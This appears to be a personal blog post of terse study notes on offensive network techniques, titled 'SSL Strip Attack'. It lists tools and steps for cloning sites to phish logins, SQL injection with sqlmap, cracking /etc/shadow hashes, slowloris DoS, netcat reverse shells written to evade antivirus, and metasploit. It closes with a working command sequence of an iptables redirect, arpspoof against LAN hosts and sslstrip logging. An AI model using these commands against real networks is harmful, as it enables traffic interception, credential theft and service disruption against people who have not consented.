---
title      : "SSL Strip Attack"
date       : 2019-09-19T19:07:54Z
publishdate: 2019-09-19T19:07:54Z
draft      : false
comments   : false
weight     : 5
revision   : 0
series:
- Security
categories:
- development
tags:
- ssl
---

<!-- more -->
* convert `https` to `http`
* Peoplr try to reuse/recycle the passwords
* Bannergrab and search
* Home router attacking
  * steal bacupfile binary file
  * decode binary to human redable format
* nmap can run scripts
* setup fake DNS server in your home router
* `setoolkit`
  * clone a website and run from your machines
* [SQL Injection](https://www.youtube.com/watch?v=ciNHn38EyRc)
  * user -> website -> database (mostly MD5 hashs)
  * attacker -> database
  * User credentials are not the only useful infomration you can find
    * hackers stealing credit card info (which was in plain text)
  * http://www.dvwa.co.uk/
    * run sql-client
  * get `sessionid` cookie
    * most security and IDS are active on login page
      * create a user, log in and then perform attack
  * get [`sqlmap`](http://sqlmap.org/)
    * download everything, then analyze later
  * Second order injection
* BReak HASHes
  * john the ripper
  * hydra - a very fast network logon cracker which supports many different services
    * someone scans your router multiple times everyday for default passwords
    * use over Proxies
  * `findmyhash`
  * passwords are saved at `/etc/shadow`
  * Why crack password when you are already the root?
    * People tend to reuse the passwords
  * `unshadow` - combines passwd and shadow files
* DoS - Denial of service
  * `hping3`
  * practise on your own router
  * `namp --script http-slowloris --max-parallelism 400 192.169.1.1 -vv`
* Script Kiddies
* Reverse Shells
  * `netcat`
    * 
  * mostly detected by Anti viruses on fully updated systems
    * Try to code by yourself
* `metasploit`
  * Exploit Fframework
    * Take a vurnability then explot it
      * vurnability detection
    * webcam snap

iptables/ip6tables
: administration tool for IPv4/IPv6 packet filtering and NAT

Redirect all traffic to port 8080

```
iptables -t nat -I PREROUTING --src 0/0 --dst 127.0.0.1 -p tcp --dport 80 -j REDIRECT --to-ports 8080   

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080   

# verify
iptables --table nat --list PREROUTING
```

{{< cmd >}}
# Identify target
route
nmap [[[192.168.1.2-254]]]

# launch SSL strip attack
arpspoof -i wlp2s0 -t 192.168.1.103 -r 192.168.0.1
sslstrip -l 8080
tail -f sslstrip.log
{{< cmd >}}

1. Scan/Discover entire local network

## Fun things

1. change browser languague while at work
2. `squid3`, `apache`, `imagemagick`, `ghostscript`, `jp2a`
   1. configure `/etc/squid3.conf`

* DNS Attacks
* `bridge-utils`
  * `brctl addbr evil`
  * `brctl addif evil at0`
  * `ip addr evil at0 up`
  * `dhclient evil &`

### Footnotes

[^1]:
[^2]:
